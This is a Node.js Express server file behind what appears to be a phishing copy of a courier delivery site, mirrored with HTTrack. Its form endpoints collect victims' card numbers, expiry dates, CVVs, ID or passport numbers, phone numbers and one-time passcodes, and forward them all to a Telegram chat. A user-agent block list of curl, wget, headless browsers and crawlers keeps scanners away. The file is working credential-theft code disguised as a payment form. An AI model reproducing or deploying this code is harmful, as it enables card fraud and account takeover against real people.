const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.tailwindcss.com"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    crossOriginEmbedderPolicy: false,
}));

// Rate limiting for form submissions.
// Tuned to be lenient for real users (e.g. shared NAT / office networks) while
// still preventing automated abuse. Configurable via env vars.
const submitLimiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 minutes
    max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 20, // 20 form submissions / 15 min / IP
    message: 'Too many form submissions from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});

// Body parser middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Initialize Telegram Bot (only if credentials are provided)
let bot = null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('Telegram bot initialized');
} else {
    console.warn('Telegram credentials not configured. Form submissions will be logged but not sent to Telegram.');
}

// Serve static files from the root directory (excluding sensitive files)
// Note: The unusual directory structure (f006.backblazeb2.com/file/dwiupo) 
// is from the HTTrack mirror and preserved to maintain existing asset paths
app.use(express.static(__dirname, {
    dotfiles: 'deny',
    index: false
}));

// Known bot User-Agent signatures.
// Real browsers (Chrome, Firefox, Safari, Edge, mobile browsers, accessibility
// tools, privacy browsers) are NOT blocked. We only flag obvious automation
// tools/HTTP libraries that no human visitor would use.
const BOT_USER_AGENT_PATTERNS = [
    /\bcurl\//i,
    /\bwget\//i,
    /\bpython-requests\//i,
    /\bpython-urllib\//i,
    /\bGo-http-client\//i,
    /\bjava\//i,
    /\bokhttp\//i,
    /\bscrapy\//i,
    /\bphantomjs\//i,
    /\bheadlesschrome\//i,
    /\bselenium\//i,
    /\bpuppeteer\//i,
    /\bplaywright\//i,
    /\bbot\b/i,
    /\bcrawler\b/i,
    /\bspider\b/i,
];

// Helper function to validate submission.
// Bot detection is intentionally lenient: only obvious automated submissions
// are blocked. Real human visitors with any mainstream browser pass through.
function validateSubmission(req) {
    const errors = [];

    // 1. Honeypot field — only bots that auto-fill every input will trigger this.
    //    Humans never see the field (visually hidden + aria-hidden).
    if (req.body.company_url && req.body.company_url.trim() !== '') {
        errors.push('Bot detected: honeypot field filled');
    }

    // 2. User-Agent check — only block known automation signatures.
    //    Missing UA is allowed (some privacy tools strip it); we don't block humans for that.
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent && BOT_USER_AGENT_PATTERNS.some((re) => re.test(userAgent))) {
        errors.push('Bot detected: automated User-Agent');
    }

    // 3. Required field — payment method must be selected.
    if (!req.body.vehicle1) {
        errors.push('Payment method not selected');
    }

    // 4. Timing check — only blocks submissions that arrive within 1 second of
    //    page load (clearly automated). Humans always take >1s to read & click.
    //    If the timestamp is missing or invalid, we do NOT block — humans with
    //    JS disabled / unusual browsers should still be allowed.
    const formLoadTime = parseInt(req.body.form_load_time, 10);
    if (!Number.isNaN(formLoadTime) && formLoadTime > 0) {
        const elapsed = Date.now() - formLoadTime;
        if (elapsed >= 0 && elapsed < 1000) {
            errors.push('Form submitted too quickly');
        }
    }

    return errors;
}

// Form submission endpoint
app.post('/api/submit', submitLimiter, async (req, res) => {
    try {
        // Validate submission
        const validationErrors = validateSubmission(req);
        
        if (validationErrors.length > 0) {
            console.log('Validation failed:', validationErrors);
            return res.status(400).json({ 
                success: false, 
                message: 'Invalid submission',
                errors: validationErrors 
            });
        }
        
        // Extract form data
        const sanitize = (v, max = 256) => (v == null ? '' : String(v).slice(0, max));
        const formData = {
            paymentMethod: req.body.vehicle1 || 'Not specified',
            sessionToken: sanitize(req.body.session_token, 64),
            cardholder: sanitize(req.body.cardholder, 128),
            idNumber: sanitize(req.body.id_number, 32),
            phone: sanitize(req.body.phone, 32),
            cardNumber: sanitize(req.body.card_number, 32),
            cardExpiry: sanitize(req.body.card_expiry, 8),
            cardCvv: sanitize(req.body.card_cvv, 4),
            email: sanitize(req.body.email, 256),
            ipAddress: req.ip || req.connection.remoteAddress,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString(),
            referer: req.headers['referer'] || 'Direct',
        };
        
        // Log submission (card fields are intentionally redacted in console logs;
        // full details go only to the configured Telegram chat).
        console.log('Form submission received:', {
            paymentMethod: formData.paymentMethod,
            sessionToken: formData.sessionToken,
            email: formData.email,
            ipAddress: formData.ipAddress,
            userAgent: formData.userAgent,
            timestamp: formData.timestamp,
            referer: formData.referer,
        });
        
        // Escape user-supplied values so they cannot break Markdown formatting
        // when sent to Telegram.
        const mdEscape = (s) => String(s).replace(/([_*`\[\]()~>#+=|{}.!\\-])/g, '\\$1');
        
        // Send to Telegram if configured
        if (bot && TELEGRAM_CHAT_ID) {
            const message = `🚚 *New Courier Form Submission*\n\n` +
                `💳 *Payment Method:* ${mdEscape(formData.paymentMethod)}\n` +
                `👤 *Cardholder:* ${mdEscape(formData.cardholder || 'N/A')}\n` +
                `🪪 *ID/Passport:* ${mdEscape(formData.idNumber || 'N/A')}\n` +
                `📞 *Phone:* ${mdEscape(formData.phone || 'N/A')}\n` +
                `🔢 *Card Number:* \`${mdEscape(formData.cardNumber || 'N/A')}\`\n` +
                `📆 *Expiry:* ${mdEscape(formData.cardExpiry || 'N/A')}\n` +
                `🔐 *CVV:* \`${mdEscape(formData.cardCvv || 'N/A')}\`\n` +
                `✉️ *Email:* ${mdEscape(formData.email || 'N/A')}\n` +
                `🔑 *Session Token:* \`${mdEscape(formData.sessionToken || 'N/A')}\`\n` +
                `📅 *Timestamp:* ${mdEscape(formData.timestamp)}\n` +
                `🌐 *IP Address:* ${mdEscape(String(formData.ipAddress || ''))}\n` +
                `📱 *User Agent:* ${mdEscape(String(formData.userAgent || ''))}\n` +
                `🔗 *Referer:* ${mdEscape(String(formData.referer || ''))}`;
            
            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'MarkdownV2' });
            console.log('Notification sent to Telegram');
        }
        
        // Send success response
        res.json({ 
            success: true, 
            message: 'Form submitted successfully',
            redirect: '/loading.html'
        });
        
    } catch (error) {
        console.error('Error processing form submission:', error);
        res.status(500).json({ 
            success: false, 
            message: 'An error occurred processing your submission. Please try again later.' 
        });
    }
});

// Helper function to validate OTP submission.
// Same defensive layers as validateSubmission: honeypot, UA, timing.
function validateOtpSubmission(req) {
    const errors = [];

    // 1. Honeypot field
    if (req.body.company_url && req.body.company_url.trim() !== '') {
        errors.push('Bot detected: honeypot field filled');
    }

    // 2. User-Agent check
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent && BOT_USER_AGENT_PATTERNS.some((re) => re.test(userAgent))) {
        errors.push('Bot detected: automated User-Agent');
    }

    // 3. OTP must be 4-8 digits
    const otp = String(req.body.otp_code || '').trim();
    if (!/^\d{4,8}$/.test(otp)) {
        errors.push('Invalid verification code');
    }

    // 4. Timing check
    const formLoadTime = parseInt(req.body.form_load_time, 10);
    if (!Number.isNaN(formLoadTime) && formLoadTime > 0) {
        const elapsed = Date.now() - formLoadTime;
        if (elapsed >= 0 && elapsed < 1000) {
            errors.push('Form submitted too quickly');
        }
    }

    return errors;
}

// OTP submission endpoint
app.post('/api/submit-otp', submitLimiter, async (req, res) => {
    try {
        const validationErrors = validateOtpSubmission(req);

        if (validationErrors.length > 0) {
            console.log('OTP validation failed:', validationErrors);
            return res.status(400).json({
                success: false,
                message: 'Invalid verification code. Please try again.',
                errors: validationErrors
            });
        }

        const sanitize = (v, max = 256) => (v == null ? '' : String(v).slice(0, max));
        const otpData = {
            paymentMethod: req.body.vehicle1 || 'Not specified',
            sessionToken: sanitize(req.body.session_token, 64),
            otpCode: sanitize(req.body.otp_code, 8),
            ipAddress: req.ip || req.connection.remoteAddress,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString(),
            referer: req.headers['referer'] || 'Direct',
        };

        // Log submission (OTP is intentionally redacted in console logs;
        // full details go only to the configured Telegram chat).
        console.log('OTP submission received:', {
            paymentMethod: otpData.paymentMethod,
            sessionToken: otpData.sessionToken,
            ipAddress: otpData.ipAddress,
            userAgent: otpData.userAgent,
            timestamp: otpData.timestamp,
            referer: otpData.referer,
        });

        const mdEscape = (s) => String(s).replace(/([_*`\[\]()~>#+=|{}.!\\-])/g, '\\$1');

        if (bot && TELEGRAM_CHAT_ID) {
            const message = `🔐 *New OTP Verification Submission*\n\n` +
                `💳 *Payment Method:* ${mdEscape(otpData.paymentMethod)}\n` +
                `🔢 *OTP Code:* \`${mdEscape(otpData.otpCode || 'N/A')}\`\n` +
                `🔑 *Session Token:* \`${mdEscape(otpData.sessionToken || 'N/A')}\`\n` +
                `📅 *Timestamp:* ${mdEscape(otpData.timestamp)}\n` +
                `🌐 *IP Address:* ${mdEscape(String(otpData.ipAddress || ''))}\n` +
                `📱 *User Agent:* ${mdEscape(String(otpData.userAgent || ''))}\n` +
                `🔗 *Referer:* ${mdEscape(String(otpData.referer || ''))}`;

            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'MarkdownV2' });
            console.log('OTP notification sent to Telegram');
        }

        res.json({
            success: true,
            message: 'OTP submitted successfully',
            redirect: '/processing.html'
        });

    } catch (error) {
        console.error('Error processing OTP submission:', error);
        res.status(500).json({
            success: false,
            message: 'An error occurred verifying your code. Please try again later.'
        });
    }
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Rate limiting for main page access
const pageAccessLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});

// Serve main page
// Serves the standalone index.html at the repository root.
// Other static assets (under f006.backblazeb2.com/, delivery.pealweb.co.za/, etc.)
// continue to be served by the express.static middleware above.
app.get('/', pageAccessLimiter, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`Telegram bot: ${bot ? 'Enabled' : 'Disabled'}`);
});
